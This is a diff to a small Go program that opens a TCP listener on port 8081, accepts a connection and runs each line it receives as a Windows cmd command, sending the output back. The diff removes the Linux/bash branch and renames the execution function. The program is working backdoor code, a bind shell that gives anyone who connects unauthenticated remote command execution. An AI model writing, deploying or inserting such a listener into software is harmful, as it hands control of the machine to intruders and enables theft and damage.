@@ -5,7 +5,6 @@ import (
 	"bufio"
 	"net"
 	"os/exec"
-	"runtime"
 	"strings"
 	"syscall"
 
@@ -15,14 +14,9 @@ import (
 var shell, arSh string
 
 func main() {
-	
-	if runtime.GOOS == "windows" {
-		shell = "cmd"
-		arSh = "/c"
-	} else {
-		shell = "bash"
-		arSh = "-c"
-	}
+
+	shell = "cmd"
+	arSh = "/c"
 
 	ln, _ := net.Listen("tcp", ":8081")
 	conn, _ := ln.Accept()
@@ -33,15 +27,14 @@ func main() {
 			break
 		}
 		message := arSh + strings.TrimRight(str, "\r\n")
-
-		Result := winShellExe(shell, string(message))
+		Result := shellExe(shell, string(message))
 		conn.Write([]byte(Result + "<<<<endMessage>>>\n"))
 	}
 
 	conn.Close()
 }
 
-func winShellExe(shell string, strCommand string) (out string) {
+func shellExe(shell string, strCommand string) (out string) {
 
 	argsCommand := strings.Split(strCommand, " ")
 	cmd := exec.Command(shell, argsCommand...)
@@ -52,4 +45,3 @@ func winShellExe(shell string, strCommand string) (out string) {
 	out = string(decodeOut)
 	return
 }
-
